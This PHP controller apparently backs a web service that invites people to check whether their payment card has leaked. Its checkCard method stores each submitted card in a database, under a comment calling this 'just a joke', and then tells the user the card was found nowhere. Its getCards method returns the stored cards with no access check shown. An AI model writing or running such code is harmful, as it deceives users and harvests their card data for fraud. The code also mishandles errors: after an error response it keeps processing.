<?php

namespace App\Controller;

use App\Database\Database;
use App\Repository\CardRepository;
use App\Utils\CardValidator;

class CardController
{
    private CardRepository $cardRepository;


    public function __construct()
    {
        $db = new Database()->getConnection();
        $this->cardRepository = new CardRepository($db);
    }

    public function checkCard()
    {
        header("Content-type: application/json");

        $cardData = $this->getRequestData();

        if (!$cardData) {
            $this->sendResponse("Json inválido.", true);
        }

        if (!CardValidator::isValidCard($cardData)) {
            $this->sendResponse("Dados do cartão inválidos.", true);
        }

        $this->processCard($cardData);

    }

    // Get JSON data from request body
    private function getRequestData(): ?array
    {
        $json = file_get_contents('php://input');
        $data = json_decode($json, true);
        return json_last_error() === JSON_ERROR_NONE ? $data : null;
    }

    private function sendResponse(string $message, bool $error): void
    {
        echo json_encode(['error' => $error, 'message' => $message], JSON_THROW_ON_ERROR);
    }

    private function processCard(array $cardData)
    {
        try {
            //save card data to database just a joke :D
            $this->cardRepository->saveCard($cardData);
            $this->sendResponse("Seu cartão não foi encontrado em nenhum registro na web.", false);
        } catch (\Exception $e) {
            $this->sendResponse("Ocorreu um error ao verificar o cartão.", true);
        }
    }


    public function getCards(): void
    {
        header('Content-Type: application/json');

        $page = $_GET['page'] ?? 1;
        $limit = $_GET['limit'] ?? 10;
        $page = is_numeric($page) ? (int)$page : 1;
        $limit = is_numeric($limit) ? (int)$limit : 10;
        $limit = max(1, min($limit, 100));
        $cards = $this->cardRepository->getCards($page, $limit);
        $totalCards = count($cards);
        $totalPages = ceil($totalCards / $limit);
        $response = [
            'cards' => $cards,
            'totalCards' => $totalCards,
            'totalPages' => $totalPages,
            'currentPage' => $page,
            'limit' => $limit
        ];
        echo json_encode($response);
    }
}